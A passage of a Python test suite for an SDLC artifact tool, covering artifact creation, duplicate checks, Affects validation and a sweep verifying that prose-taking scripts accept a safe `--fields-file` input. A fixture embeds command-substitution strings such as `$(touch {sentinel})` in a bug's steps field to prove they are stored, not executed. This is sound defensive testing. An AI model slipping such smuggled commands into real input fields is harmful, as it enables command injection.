        # FOOTPRINT. BG0511 narrowed this from "accepts it" - a freshly created bug carries no
        # authored criteria, and the planner now says so rather than admitting a unit nobody can
        # judge. What the creator is answerable for is what the creator knows: Affects and Points.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            r = artifact.new(repo, "bug", "a defect",
                             {"severity": "High", "affects": "src/a.py, src/b.py",
                              "points": 5})
            path = Path(r["path"])
            self.assertEqual(sdlc_md.affects_files(path.read_text(encoding="utf-8")),
                             ["src/a.py", "src/b.py"])
            bd = self._plan_verdict(repo, path, "bug")
            gaps = " ".join(bd["ungroomed"][0]["missing"]) if bd["ungroomed"] else ""
            self.assertNotIn("Affects", gaps)
            self.assertNotIn("Points", gaps)

    def test_a_created_cr_is_plannable_on_every_template(self) -> None:
        # The full template grafts a rich body over the same head. A CR whose size the planner
        # cannot read back is unsized however the body was rendered.
        for template in ("minimal", "planning", "full"):
            with self.subTest(template=template), tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "cr",
                       "| ID | Title | Status | Priority | Type | Date | Linked Epics |")
                r = artifact.new(repo, "cr", "tighten the gate",
                                 {"priority": "High", "ctype": "Improvement", "impact": "i",
                                  "affects": "src/gate.py", "size": "L",
                                  "template": template})
                path = Path(r["path"])
                # Footprint only, per BG0511: every template renders its criteria section as a
                # `{{...}}` scaffold, and the census now reads that shape on a CR as it always
                # did on a story. The unfilled scaffold IS a grooming debt; what this test is
                # about is that the SIZE and the FILES survive every rendering.
                bd = self._plan_verdict(repo, path, "cr")
                gaps = " ".join(bd["ungroomed"][0]["missing"]) if bd["ungroomed"] else ""
                self.assertNotIn("Affects", gaps,
                                 f"{template}: the planner refuses a CR this creator wrote")
                self.assertNotIn("Size", gaps, f"{template}: the size did not read back")
                self.assertNotIn("Points", gaps, f"{template}: the size did not read back")


# --- US0306: the sweep (L-0154 - a defect found in one writer is swept across its siblings) ---

#: The payload, shaped exactly as `test_file_finding` shapes it: commands in the prose, a
#: `$(...)`, a trailing backslash, and a sentinel path inside the test's own temp tree (never the
#: working tree - L-0158). Free of bare `snake_case` and of any `**Field:**` line, so the
#: markdown-safety pass is the identity and "character for character" means exactly that.
STEPS_PAYLOAD = (
    "1. Stage a change, then run `git commit -a` against the live tree.\n"
    "2. Read the head back with `$(git rev-parse HEAD)`.\n"
    "3. Break the command over a line with a trailing backslash \\\n"
    "4. And here is the one that proves it: `$(touch {sentinel})`\n"
)
#: The sentinel command is BACKTICKED so the temp path inside it sits in a code span:
#: the filer's markdown-safety pass rewrites bare `snake_case` outside code spans, and a
#: temp directory whose random name happens to hold an underscore would otherwise make
#: this fidelity assertion pass or fail by luck of the draw.


def _git_repo(repo: Path) -> None:
    import gitutil
    gitutil.git(["init", "-q", "-b", "main"], repo)
    (repo / "seed.txt").write_text("seed\n", encoding="utf-8")
    gitutil.git(["add", "seed.txt"], repo)
    gitutil.git(["commit", "-qm", "seed"], repo)
    (repo / "staged.txt").write_text("staged\n", encoding="utf-8")
    gitutil.git(["add", "staged.txt"], repo)


def _git_state(repo: Path) -> tuple[str, bytes]:
    import gitutil
    head = gitutil.git(["rev-parse", "HEAD"], repo).stdout.decode()
    return head, (repo / ".git" / "index").read_bytes()


class ArtifactJsonInputTests(unittest.TestCase):
    """US0306 AC1: `artifact new` accepts the same non-shell input path with the same fidelity
    as `file_finding file`. It is the writer the skill's own guidance pushes agents towards, so
    fixing one and not the other would leave the likelier caller carrying the defect."""

    def _spec(self, repo: Path, payload: str) -> Path:
        import json
        p = repo / "finding.json"
        p.write_text(json.dumps({
            "title": "creating executes the steps it is given",
            "severity": "High", "summary": f"see the steps: {payload}",
            "steps": payload, "fix": "read the fields from a file",
            "affects": "src/thing.py", "points": 3}), encoding="utf-8")
        return p

    def _created(self, repo: Path) -> Path:
        return next(p for p in (repo / "sdlc-studio" / "bugs").glob("*.md")
                    if p.name != "_index.md")

    def test_a_bug_created_from_json_reads_back_character_for_character(self) -> None:
        import contextlib
        import io
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            payload = STEPS_PAYLOAD.format(sentinel=repo / "EXECUTED")
            with contextlib.redirect_stdout(io.StringIO()):
                rc = artifact.main(["new", "--type", "bug", "--fields-file",
                                    str(self._spec(repo, payload)), "--root", str(repo)])
            self.assertEqual(rc, 0)
            body = self._created(repo).read_text(encoding="utf-8")
            self.assertIn(payload, body)          # every character, in one contiguous run
            self.assertIn("`git commit -a`", body)
            self.assertIn("$(git rev-parse HEAD)", body)

    def test_creating_that_payload_leaves_head_and_the_index_untouched(self) -> None:
        import contextlib
        import io
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _git_repo(repo)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            sentinel = repo / "EXECUTED"
            payload = STEPS_PAYLOAD.format(sentinel=sentinel)
            spec = self._spec(repo, payload)
            before = _git_state(repo)
            with contextlib.redirect_stdout(io.StringIO()):
                rc = artifact.main(["new", "--type", "bug", "--fields-file", str(spec),
                                    "--root", str(repo)])
            self.assertEqual(rc, 0)
            self.assertEqual(_git_state(repo), before)
            self.assertFalse(sentinel.exists())

    def test_an_unknown_key_is_refused_here_too(self) -> None:
        import contextlib
        import io
        import json
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            spec = repo / "finding.json"
            spec.write_text(json.dumps({"title": "t", "severity": "High", "summary": "s",
                                        "steps": "x", "fix": "y", "stpes": "typo",
                                        "affects": "src/thing.py", "points": 3}),
                            encoding="utf-8")
            err = io.StringIO()
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(err):
                rc = artifact.main(["new", "--type", "bug", "--fields-file", str(spec),
                                    "--root", str(repo)])
            self.assertNotEqual(rc, 0)
            self.assertIn("stpes", err.getvalue())

    def test_a_story_can_carry_its_own_fields_in_the_document(self) -> None:
        # The allowed keys are per-writer: `artifact new` also takes an epic, a persona and
        # verifiers, and refusing them here would make the safe path unusable for a story.
        import contextlib
        import io
        import json
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            spec = repo / "story.json"
            spec.write_text(json.dumps({"title": "do a thing", "epic": "EP0001",
                                        "summary": "s", "points": 3}), encoding="utf-8")
            with contextlib.redirect_stdout(io.StringIO()):
                rc = artifact.main(["new", "--type", "story", "--fields-file", str(spec),
                                    "--root", str(repo)])
            self.assertEqual(rc, 0)


class SharedHazardHelperTests(unittest.TestCase):
    """US0306 AC2: ONE hazard implementation, called by both writers. Two copies of a pattern
    list drift, and a drifted list is the silent half of this defect all over again."""

    def _flag_create(self, repo: Path, steps: str) -> str:
        import contextlib
        import io
        err = io.StringIO()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(err):
            artifact.main(["new", "--type", "bug", "--title", "a defect", "--severity", "High",
                           "--summary", "s", "--steps", steps, "--fix", "y",
                           "--affects", "src/thing.py", "--points", "3", "--root", str(repo)])
        return err.getvalue()

    def _flag_file(self, repo: Path, steps: str) -> str:
        import contextlib
        import io
        import file_finding
        err = io.StringIO()
        with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(err):
            file_finding.main(["file", "--type", "bug", "--title", "a defect",
                               "--severity", "High", "--summary", "s", "--steps", steps,
                               "--fix", "y", "--affects", "src/thing.py", "--points", "3",
                               "--root", str(repo)])
        return err.getvalue()

    def test_both_writers_report_the_same_field_with_the_same_wording(self) -> None:
        steps = "run `git status and read it"
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            via_artifact = self._flag_create(repo, steps)
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
            via_filer = self._flag_file(repo, steps)
        self.assertTrue(via_artifact.strip())
        self.assertEqual(via_artifact, via_filer)   # same helper, so byte-identical

    def test_the_helper_has_one_home_and_the_creator_borrows_it(self) -> None:
        # By SOURCE FILE, not by object identity: a sibling suite that reloads `file_finding`
        # rebinds the module object, and an identity assertion would then fail for a reason
        # that has nothing to do with where the helper lives.
        import inspect
        for fn in (artifact.file_finding.shell_hazards,
                   artifact.file_finding.report_shell_hazards):
            self.assertEqual(Path(inspect.getsourcefile(fn)).name, "file_finding.py")
        # ...and the creator keeps no copy of its own to drift from that one
        self.assertFalse(hasattr(artifact, "shell_hazards"))
        self.assertFalse(hasattr(artifact, "report_shell_hazards"))

    def test_every_hazard_shape_is_reported_by_both(self) -> None:
        for steps in ("run `git status and read it", "capture $(git rev-parse HEAD)",
                      "continue the command \\"):
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
                a = self._flag_create(repo, steps)
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
                f = self._flag_file(repo, steps)
            self.assertTrue(a.strip(), steps)
            self.assertEqual(a, f, steps)


#: The writers that HAVE the non-shell input path. Adding a writer here without the flag fails
#: the sweep, and so does adding a prose writer to `scripts/` that appears in neither list.
SAFE_INPUT_WRITERS = {"file_finding.py", "artifact.py",
                      # gained --fields-file (shared file_finding.resolve_prose_fields loader):
                      "critic.py", "close_owed.py", "sprint.py",
                      # ...and the four the six original flag spellings could not see at all:
                      "decisions.py", "lessons.py", "ledger.py", "handoff.py",
                      # ...and validate.py, whose warning-ratchet --stamp takes a reason:
                      "validate.py"}

#: The sibling prose writers the sweep found and could NOT reach in this batch, each with the
#: reason. D0052 ruled the sweep WIDER than the two files CR0384 names, and these four carry the
#: same free-prose flags for the same reason - they are recorded here, named, rather than the
#: sweep being quietly narrowed to the two that were convenient. Each is owned by another unit's
#: file scope in this batch, so the fix is a follow-up; this list is what makes that visible.
#: Emptying an entry is the point: when a writer gains `--fields-file`, delete its line here.
KNOWN_PROSE_WRITER_GAPS = {
    "telemetry.py": "its only _PROSE_FLAGS match is `show --summary`, a store_true BOOLEAN, not "
                    "free prose - it carries no shell hazard. The earlier 'note prose on the "
                    "command line' reason was wrong: telemetry has no narrative flag. Recorded "
                    "here as safe-by-nature (like mutation.py) rather than given a --fields-file "
                    "for prose that does not exist.",
    "mutation.py": "its free-prose flags are `window open --note` and `register --reason`, both "
                   "written to transient .local state (the mutation ledger under "
                   "sdlc-studio/.local/) rather than into an artefact body, so both are outside "
                   "the filing hazard - recorded here rather than quietly dropped from the "
                   "enumeration. `--reason` only became visible when the sweep widened past its "
                   "first six flag spellings, which is the point of widening it",
}

#: A flag whose value is free prose an author writes - the shape that carries the hazard. An
#: enum, a path or an id does not: a shell metacharacter in `--status Done` is a typo, not a
#: swallowed command.
_PROSE_FLAGS = ("--steps", "--fix", "--summary", "--impact", "--note", "--goal",
                # the spellings the first six missed entirely: a writer taking prose under a
                # name nobody enumerated is unaccounted, not safe
                "--rationale", "--body", "--reason", "--title")

#: The writers the six original spellings could not see, with the prose flag that hid them.
#: Kept as data so the AC that widened the sweep asserts the parser really accepts each flag,
#: rather than asserting that a tuple has grown.
LATE_FOUND_PROSE_SPELLINGS = {
    "decisions.py": ("--rationale",),
    "lessons.py": ("--body", "--reason"),
    "ledger.py": ("--rationale",),
    "handoff.py": ("--title",),
}


def _parser_options(parser) -> set[str]:
    """Every option string an argparse parser accepts, walking into its subparsers."""
    import argparse as _ap
    out: set[str] = set()
    for action in parser._actions:
        out.update(action.option_strings)
        if isinstance(action, _ap._SubParsersAction):
            for sub in action.choices.values():
                out |= _parser_options(sub)
    return out


class ProseWriterSweepTests(unittest.TestCase):
    """US0306 AC3: the sweep is ENUMERATED, not grepped once by hand. A writer added later with
    free-prose flags and no non-shell path FAILS this test, rather than being discovered by the
    next silent truncation."""

    def _prose_writers(self) -> dict[str, str]:
        """script name -> source, for every script exposing a free-prose flag."""
        import re as _re
        found: dict[str, str] = {}
        for path in sorted(SCR.glob("*.py")):
            try:
                src = path.read_text(encoding="utf-8")
            except (OSError, UnicodeDecodeError):
                continue
            if any(_re.search(rf'add_argument\(\s*"{_re.escape(flag)}"', src)
                   for flag in _PROSE_FLAGS):
                found[path.name] = src
        return found

    def test_the_enumeration_finds_something_to_judge(self) -> None:
        # A sweep that enumerated nothing would pass vacuously, which is the failure mode this
        # whole test exists to refuse elsewhere.
        writers = self._prose_writers()
        self.assertTrue(writers)
        for name in SAFE_INPUT_WRITERS:
            self.assertTrue(name in writers, f"{name} no longer exposes a free-prose flag")

    def test_every_prose_writer_is_either_safe_or_a_named_gap(self) -> None:
        unaccounted = sorted(set(self._prose_writers())
                             - SAFE_INPUT_WRITERS - set(KNOWN_PROSE_WRITER_GAPS))
        self.assertEqual(
            unaccounted, [],
            "these scripts take free prose on the command line with no non-shell input path "
            f"and no recorded reason: {unaccounted}. Give them `--fields-file` (see "
            "file_finding.load_fields_file), or record why not in KNOWN_PROSE_WRITER_GAPS")

    def test_telemetry_takes_no_free_prose_at_all(self) -> None:
        """US0392 AC1, on a selector of its own (US0635).

        AC1's claim is that telemetry is safe BY NATURE - it has no narrative flag - which is a
        different claim from AC3's, that the four deferred writers are no longer deferred. They
        shared one selector, so a regression in either failed both and neither said which.

        Asserted against the source rather than the reason string: a recorded reason is prose,
        and prose cannot notice telemetry growing a real prose flag tomorrow. If it ever does,
        this reddens and the safe-by-nature classification has to be re-earned.
        """
        import re as _re
        src = self._prose_writers().get("telemetry.py")
        self.assertIsNotNone(src, "telemetry.py no longer matches the prose-flag sweep at all")
        matched = [flag for flag in _PROSE_FLAGS
                   if _re.search(rf'add_argument\(\s*"{_re.escape(flag)}"', src)]
        self.assertEqual(["--summary"], matched,
                         f"telemetry matches prose flags beyond --summary: {matched}")
        # ... and that one is a BOOLEAN. A store_true stores no prose, which is the whole
        # ground for the classification.
        self.assertRegex(src, r'add_argument\(\s*"--summary"[^)]*store_true',
                         "--summary is no longer a store_true, so it may now carry prose")
        self.assertIn("safe-by-nature", KNOWN_PROSE_WRITER_GAPS["telemetry.py"],
                      "telemetry's recorded reason no longer states the classification")

    def test_the_four_cr0392_writers_are_now_safe(self) -> None:
        """US0392 AC3: none of the four deferred writers remains a DEFERRED gap. Three genuinely
        took prose and gained `--fields-file` (now SAFE_INPUT_WRITERS); telemetry took no prose
        (its `--summary` is a boolean) and is reclassified safe-by-nature, not deferred."""
        for name in ("critic.py", "close_owed.py", "sprint.py"):
            self.assertIn(name, SAFE_INPUT_WRITERS, f"{name} should have a non-shell input path")
        # telemetry stays a named gap, but as safe-by-nature, NOT a deferred one
        self.assertIn("telemetry.py", KNOWN_PROSE_WRITER_GAPS)
        for name in ("critic.py", "close_owed.py", "sprint.py", "telemetry.py"):
            reason = KNOWN_PROSE_WRITER_GAPS.get(name, "")
            self.assertNotIn("deferred", reason,
                             f"{name} is still recorded as a deferred gap; it should be resolved")

    def test_the_sweep_enumerates_body_rationale_and_reason_spellings(self) -> None:
        """US0361 AC2: the enumeration looked for six flag spellings, so four writers taking
        free prose under other names were not a recorded gap - they were INVISIBLE to it. An
        unaccounted writer is the state this whole sweep exists to refuse."""
        writers = self._prose_writers()
        missing = sorted(n for n in LATE_FOUND_PROSE_SPELLINGS if n not in writers)
        self.assertEqual(missing, [], f"{missing} take free prose under a flag the sweep does "
                                      f"not look for, so they are unaccounted rather than safe")
        for name, flags in sorted(LATE_FOUND_PROSE_SPELLINGS.items()):
            options = self._options_of(name)
            for flag in flags:
                # asked of the parser, so a spelling that is only MENTIONED cannot satisfy this
                self.assertIn(flag, options, f"{name} does not accept {flag}")
                self.assertIn(flag, _PROSE_FLAGS,
                              f"{flag} is free prose on {name} but the sweep does not look "
                              f"for it - a writer taking prose under a new flag name would "
                              f"pass this sweep by being unnamed")

    def _options_of(self, name: str) -> set[str]:
        """Every flag the script's own PARSER accepts, subcommands included.

        Asked of the parser, never of the source text: a grep for the flag name is satisfied by
        a help string or an error message that merely MENTIONS it, so a writer that renamed its
        safe path would still read as safe."""
        spec = importlib.util.spec_from_file_location(f"_sweep_{name[:-3]}", SCR / name)
        mod = importlib.util.module_from_spec(spec)
        sys.modules[spec.name] = mod
        spec.loader.exec_module(mod)
        return _parser_options(mod.build_parser())

    def test_every_safe_writer_really_offers_the_path(self) -> None:
        for name in sorted(SAFE_INPUT_WRITERS):
            self.assertIn("--fields-file", self._options_of(name),
                          f"{name} is listed as safe but its parser accepts no --fields-file")

    def test_a_gap_that_has_been_closed_must_leave_the_list(self) -> None:
        # The list records what is OWED. An entry that is no longer true is a debt nobody will
        # ever pay off, because nothing says it was paid.
        stale = sorted(n for n in KNOWN_PROSE_WRITER_GAPS
                       if "--fields-file" in self._options_of(n))
        self.assertEqual(stale, [],
                         f"{stale} now offer --fields-file - move them to SAFE_INPUT_WRITERS")

    def test_each_recorded_gap_names_a_reason(self) -> None:
        for name, why in KNOWN_PROSE_WRITER_GAPS.items():
            self.assertTrue(why.strip(), name)
            self.assertTrue(name in self._prose_writers(),
                            f"{name} is recorded as a gap but exposes no free-prose flag - "
                            "delete the entry rather than leaving a claim nothing checks")


class AffectsValidatedAtMintTests(unittest.TestCase):
    """US0324: `artifact new` refuses a declared `Affects` that resolves to nothing BEFORE an id
    is allocated - minting nothing - while a path to a file the unit will CREATE stays legitimate,
    and a recorded grooming opt-out downgrades the refusal to a warning."""

    def _story_repo(self) -> tuple[Path, tempfile.TemporaryDirectory]:
        td = tempfile.TemporaryDirectory()
        repo = Path(td.name)
        _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
        _epic(repo)
        return repo, td

    def test_new_refuses_an_unresolvable_affects_and_allocates_no_id(self) -> None:
        repo, td = self._story_repo()
        with td:
            # BG0558: the rule catches a TYPO, so the fixture names a wrong directory on
            # a file that exists. `ghost/nope.py` matched no basename anywhere, which is
            # a unit CREATING a file and is no longer refused.
            (repo / "real").mkdir(exist_ok=True)
            (repo / "real" / "nope.py").write_text("", encoding="utf-8")
            idx = repo / "sdlc-studio" / "stories" / "_index.md"
            before = idx.read_text(encoding="utf-8")
            with self.assertRaises(ValueError) as cm:
                artifact.new(repo, "story", "wrong path",
                             {"epic": "EP0001", "points": 3, "affects": "ghost/nope.py"})
            self.assertIn("resolves to nothing", str(cm.exception))
            # nothing written: no story file, the index byte-identical
            stories = [p for p in (repo / "sdlc-studio" / "stories").glob("*.md")
                       if p.name != "_index.md"]
            self.assertEqual(stories, [])
            self.assertEqual(idx.read_text(encoding="utf-8"), before)
            # ... and no id burnt: the next SUCCESSFUL mint takes US0001, the refused call's id
            ok = artifact.new(repo, "story", "real path",
                              {"epic": "EP0001", "points": 3, "affects": "src/thing.py"})
            self.assertEqual(ok["id"], "US0001")

    def test_a_partly_unresolvable_affects_still_mints(self) -> None:
        # One existing file + one the unit will CREATE is the ordinary case; the check refuses
        # only when NO declared path resolves. Verified through artifact.new AND refine.apply.
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            affects = "src/thing.py, src/not-written-yet.py"
            r = artifact.new(repo, "story", "half new",
                             {"epic": "EP0001", "points": 3, "affects": affects})
            body = Path(r["path"]).read_text(encoding="utf-8")
            self.assertEqual(sdlc_md.affects_files(body),
                             ["src/thing.py", "src/not-written-yet.py"])  # stored verbatim
        with tempfile.TemporaryDirectory() as d:
            repo = Path(d)
            (repo / "sdlc-studio" / "change-requests").mkdir(parents=True)
            (repo / "src").mkdir()
            (repo / "src" / "thing.py").write_text("", encoding="utf-8")
            (repo / "sdlc-studio" / "change-requests" / "CR0001-x.md").write_text(
                "# CR-0001: t\n\n> **Status:** Approved\n> **Priority:** P1\n"
                "> **Type:** Improvement\n> **Size:** L\n\n## Summary\n\ns\n\n## Impact\n\ni\n",
                encoding="utf-8")
            refine = __import__("refine")
            res = refine.refine(repo, "CR0001", "E",
                                [("S", 3, "src/thing.py, src/not-written-yet.py")],
                                skip_personas=True)
            story = sdlc_md.find_by_id(repo, res["stories"][0])[0]
            self.assertEqual(sdlc_md.affects_files(story.read_text(encoding="utf-8")),
                             ["src/thing.py", "src/not-written-yet.py"])

    def test_the_recorded_opt_out_downgrades_the_refusal_to_a_warning(self) -> None:
        import contextlib
        import io
        repo, td = self._story_repo()
        with td:
            # BG0558: the rule catches a TYPO, so the fixture names a wrong directory on
            # a file that exists. `ghost/nope.py` matched no basename anywhere, which is
            # a unit CREATING a file and is no longer refused.
            (repo / "real").mkdir(exist_ok=True)
            (repo / "real" / "nope.py").write_text("", encoding="utf-8")
            (repo / "sdlc-studio" / ".config.yaml").write_text(
                "sprint:\n  breakdown: judgement\n", encoding="utf-8")
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                r = artifact.new(repo, "story", "opted out",
                                 {"epic": "EP0001", "points": 3, "affects": "ghost/nope.py"})
            self.assertTrue(Path(r["path"]).exists())          # minted: the operator opted out
            self.assertIn("resolves to nothing", err.getvalue())  # ... but never quietly


class PipeInAcTests(unittest.TestCase):
    """US0381: `--ac` pairs with `--verify` POSITIONALLY. A criterion written as
    `criterion|pytest path::Node` used to be swallowed whole as prose - the command was rewritten
    into a code span, the pipe stayed in the criterion text, and the artefact carried no Verify
    line anyone could run. The guard names it; a correctly-paired pair is untouched."""

    def _bug_repo(self) -> tuple[Path, tempfile.TemporaryDirectory]:
        td = tempfile.TemporaryDirectory()
        repo = Path(td.name)
        _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
        return repo, td

    def test_an_unescaped_pipe_without_a_paired_verify_is_warned_by_name(self) -> None:
        repo, td = self._bug_repo()
        with td:
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "piped criterion", {
                "epic": "EP0001", "points": 3, "affects": "src/thing.py",
                "acs": ["the gate refuses|pytest tests/test_gate.py::GateTests::test_refuses"]})
            notes = r.get("ac_warnings") or []
            self.assertEqual(len(notes), 1, notes)
            self.assertIn("--ac[1]", notes[0])          # named by position, not "somewhere"
            self.assertIn("--verify", notes[0])         # ... and told what to do instead
            # ... and the guard is advisory: the artefact still exists.
            self.assertTrue(Path(r["path"]).exists())

    def test_a_correctly_paired_ac_and_verify_is_byte_identical_and_silent(self) -> None:
        # The negative control AND the no-regression proof: the same criterion with its verifier
        # in the RIGHT place warns about nothing, and renders exactly as an unpiped pair does.
        verifier = "pytest tests/test_gate.py::GateTests::test_refuses"
        bodies = []
        for criterion in ("the gate refuses|and then some", "the gate refuses and then some"):
            with tempfile.TemporaryDirectory() as d:
                repo = Path(d)
                _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
                _epic(repo)
                r = artifact.new(repo, "story", "paired", {
                    "epic": "EP0001", "points": 3, "affects": "src/thing.py",
                    "acs": [criterion], "verify": [verifier]})
                self.assertEqual(r.get("ac_warnings"), None, r.get("ac_warnings"))
                bodies.append(Path(r["path"]).read_text(encoding="utf-8"))
        # The Verify line survives verbatim on the piped-criterion render too.
        self.assertIn(f"**Verify:** {verifier}", bodies[0])

    def test_an_escaped_pipe_is_left_alone(self) -> None:
        # `\|` is how a pipe is written in markdown on purpose; flagging it would train the
        # warning away. The negative case that stops the guard firing on everything.
        repo, td = self._bug_repo()
        with td:
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            r = artifact.new(repo, "story", "escaped pipe", {
                "epic": "EP0001", "points": 3, "affects": "src/thing.py",
                "acs": [r"the table cell reads a \| b"]})
            self.assertEqual(r.get("ac_warnings"), None, r.get("ac_warnings"))

    def test_the_cli_prints_the_warning_on_stderr(self) -> None:
        import contextlib
        import io
        repo, td = self._bug_repo()
        with td:
            _index(repo, "story", "| ID | Title | Status | Epic | Created | Updated |")
            _epic(repo)
            err = io.StringIO()
            with contextlib.redirect_stderr(err):
                rc = artifact.main([
                    "new", "--type", "story", "--title", "piped", "--epic", "EP0001",
                    "--points", "3", "--affects", "src/thing.py",
                    "--ac", "the gate refuses|pytest tests/test_gate.py::T::test_x",
                    "--root", str(repo)])
            self.assertEqual(rc, 0)
            self.assertIn("--ac[1]", err.getvalue())


class DuplicateCheckTests(unittest.TestCase):
    """US0413: `artifact new` - the creator this project tells agents to reach for - used to mint
    with no duplicate check at all, so a defect already on the backlog was re-filed in silence."""

    def _bug(self, repo: Path, cid: str, title: str, *, status: str = "Open",
             affects: str = "src/thing.py") -> None:
        d = repo / "sdlc-studio" / "bugs"
        d.mkdir(parents=True, exist_ok=True)
        (d / f"{cid}-x.md").write_text(
            f"# {cid}: {title}\n\n> **Status:** {status}\n> **Severity:** High\n"
            f"> **Points:** 2\n> **Affects:** {affects}\n\n## Summary\n\ns\n\n"
            "## Steps to Reproduce\n\ns\n\n## Proposed Fix\n\nf\n## Acceptance Criteria\n\n### AC1: it behaves as recorded\n\n- **Given** the recorded state\n- **Verify:** shell true\n\n", encoding="utf-8")

    def _repo(self) -> tuple[Path, tempfile.TemporaryDirectory]:
        td = tempfile.TemporaryDirectory()
        repo = Path(td.name)
        _index(repo, "bug", "| ID | Title | Status | Severity | Created | Updated |")
        return repo, td

    # The pair that motivated the check, verbatim from this repo's own backlog.
    EXISTING = ("The scrub-site sweep's worktrees exclusion matches any path component named "
                "worktrees, so it skips the ENTIRE tree when run from inside a worktree")
    REFILING = ("the site-sweep test is unrunnable inside a git worktree: an ancestor 'worktrees' "
                "path component makes SKIP_DIRS match every file, so sites={} and the pre-commit "
                "gate must be bypassed with --no-verify on parallel-worktree builds")

    def test_a_near_duplicate_is_reported_with_the_existing_id(self) -> None:
        repo, td = self._repo()
        with td:
            self._bug(repo, "BG0269", self.EXISTING)
            r = artifact.new(repo, "bug", self.REFILING,
                             {"severity": "High", "points": 2, "affects": "src/thing.py"})
            dupes = r.get("duplicate_warnings") or []
            self.assertEqual([c["id"] for c in dupes], ["BG0269"], dupes)
            self.assertEqual(dupes[0]["shared"], ["src/thing.py"])
            self.assertIn("BG0269", artifact.duplicate_note(dupes[0]))

    def test_an_ordinary_new_title_is_not_flagged(self) -> None:
        # The negative case, and the one that decides whether the check survives contact: a title
        # sharing ordinary vocabulary with an existing artefact - same file, same words a backlog
        # uses constantly - describes different work and must mint clean. A check that flagged
        # this would be turned off within a week, and a test that only asserts "a duplicate is
        # flagged" passes just as happily when the check flags everything.
        repo, td = self._repo()
        with td:
            self._bug(repo, "BG0269", self.EXISTING)
            r = artifact.new(repo, "bug",
                             "the status dashboard prints stale velocity for a closed run",
                             {"severity": "High", "points": 2, "affects": "src/thing.py"})
            self.assertEqual(r.get("duplicate_warnings"), None, r.get("duplicate_warnings"))

    def test_a_closed_artefact_still_counts_as_a_duplicate(self) -> None:
        # Re-filing something already FIXED is the case that wastes the most time: the symptom is
        # gone, so nothing on the open backlog mentions it. A check scoped to open artefacts -
        # which is what the finding filer's own lens does - would miss exactly this.
        repo, td = self._repo()
        with td:
            self._bug(repo, "BG0269", self.EXISTING, status="Fixed")
            r = artifact.new(repo, "bug", self.REFILING,
                             {"severity": "High", "points": 2, "affects": "src/thing.py"})
            dupes = r.get("duplicate_warnings") or []
            self.assertEqual([c["id"] for c in dupes], ["BG0269"], dupes)
            self.assertEqual(dupes[0]["status"], "Fixed")   # ... and says so, so the reader knows

    def test_a_different_type_is_not_compared(self) -> None:
        # An epic and the CR it was decomposed from share a title BY DESIGN. Recycling that
        # structural pairing as a duplicate claim would bury the real ones.
        repo, td = self._repo()
        with td:
            _index(repo, "cr", "| ID | Title | Status | Priority | Type | Size | Date |")
            (repo / "sdlc-studio" / "change-requests" / "CR0001-x.md").write_text(
                f"# CR-0001: {self.EXISTING}\n\n> **Status:** Open\n> **Priority:** P1\n"
                "> **Type:** Improvement\n> **Size:** M\n> **Affects:** src/thing.py\n\n"
                "## Summary\n\ns\n\n## Impact\n\ni\n## Acceptance Criteria\n\n### AC1: it behaves as recorded\n\n- **Given** the recorded state\n- **Verify:** shell true\n\n", encoding="utf-8")
            r = artifact.new(repo, "bug", self.REFILING,
                             {"severity": "High", "points": 2, "affects": "src/thing.py"})
            self.assertEqual(r.get("duplicate_warnings"), None, r.get("duplicate_warnings"))


class DuplicateSingleSourceTests(DuplicateCheckTests):
    """BG0294: there were TWO duplicate detectors with different algorithms (Jaccard in
    file_finding, containment in artifact), so the repo answered 'is this a duplicate?' two ways
    depending on the entry point. One implementation now, reached from both."""

    def test_both_entry_points_call_one_implementation(self) -> None:
        """AC1. file_finding.duplicate_candidates routes through artifact.duplicate_candidates -
        the second implementation is deleted, not kept in sync. Proven two ways: file_finding calls
        artifact's function, and the two entry points agree on the same repo."""
        import file_finding
        repo, td = self._repo()
        with td:
            self._bug(repo, "BG0269", self.EXISTING)
            # Patch the SAME module object file_finding's lazy `import artifact` resolves to
            # (sys.modules["artifact"]), not this test module's own `artifact` global - under the
            # full suite another loader may have replaced sys.modules["artifact"], leaving that
            # global stale and the spy on the wrong object.
            art = sys.modules["artifact"]
            calls = []
            real = art.duplicate_candidates

            def spy(root, type_, title, fields=None):
                calls.append(type_)
                return real(root, type_, title, fields)

            art.duplicate_candidates = spy
            try:
                ff_out = file_finding.duplicate_candidates(
                    repo, self.REFILING, {"affects": "src/thing.py"})
            finally:
                art.duplicate_candidates = real
            self.assertTrue(calls, "file_finding did not call artifact.duplicate_candidates")
            self.assertIn("bug", calls)
            # the two entry points agree: what file_finding surfaces for a bug is what the bug
            # entry point surfaces
            art_out = art.duplicate_candidates(repo, "bug", self.REFILING,
                                               {"affects": "src/thing.py"})
